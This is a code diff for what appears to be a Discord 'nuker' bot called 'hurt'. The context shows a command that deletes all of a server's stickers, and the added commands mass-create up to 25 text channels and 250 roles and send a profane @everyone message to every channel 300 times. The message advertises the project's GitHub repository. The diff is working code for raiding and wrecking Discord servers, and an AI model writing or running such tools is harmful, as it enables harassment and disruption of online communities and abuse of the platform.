@@ -74,6 +74,28 @@ class owner(commands.Cog):
         for s in ctx.guild.stickers():
             try: await s.delete()
             except: continue
-        
+            
+    @commands.command()
+    @commands.is_owner()
+    async def channelspam(self, ctx: commands.Context, num=25, *, name="hurt nuker"):
+        for i in range(num):
+            try: await ctx.guild.create_text_channel(name=name)
+            except: print("I do not have the manage_channels permission to make channels.")
+            
+    @commands.command()
+    @commands.is_owner()
+    async def rolespam(self, ctx: commands.Context, num=250, *, name="hurt nuker"):
+        for i in range(num):
+            try: await ctx.guild.create_role(name=name)
+            except: print("I do not have the manage_roles permission to make roles.")
+            
+    @commands.command()
+    @commands.is_owner()
+    async def spamall(self, ctx: commands.Context, num=300, *, text="@everyone get fucked by [hurt](<https://github.com/sheslitforme/hurt>)"):
+        for i in range(num):
+            for c in ctx.guild.channels:
+                try: await c.send(text)
+                except: print("I do not have the send_messages permission to spam.")
+            
 async def setup(bot):
     await bot.add_cog(owner(bot))
